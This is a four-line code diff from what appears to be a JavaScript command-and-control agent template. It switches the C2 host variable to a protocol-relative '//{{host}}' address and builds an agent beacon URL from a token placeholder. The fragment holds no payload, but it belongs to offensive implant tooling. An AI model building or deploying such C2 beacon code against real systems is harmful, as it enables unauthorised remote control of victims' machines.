@@ -1,4 +1,4 @@
-C2_HOST = '{{proto}}://{{host}}';
+C2_HOST = '//{{host}}';
 C2_SERVER = C2_HOST + '/agent/{{agent_token}}';
 
 var counter = 0;
